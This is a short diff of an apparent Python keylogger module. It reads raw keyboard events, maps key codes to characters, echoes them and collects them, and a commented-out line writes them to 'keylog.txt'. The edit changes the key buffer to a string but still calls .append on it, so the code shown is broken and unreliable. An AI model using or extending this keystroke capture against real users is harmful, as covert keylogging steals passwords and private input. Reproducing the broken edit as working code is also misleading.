@@ -38,7 +38,7 @@ def run(**args):
 
 	event = in_file.read(EVENT_SIZE)
 	x = 1
-	pressedKey = []
+	pressedKey = ""
 	start = time.clock()
 	
 	verbose = False
@@ -63,7 +63,7 @@ def run(**args):
 				#logger = open("keylog.txt", "a")
 				if candidate == 28:  # handle enter
 					sys.stdout.write("\n")
-					pressedKey.append(KEYS[kbl][candidate])
+					pressedKey.append("\n")
 					#logger.write("\n")
 				else:
 					sys.stdout.write(KEYS[kbl][candidate])
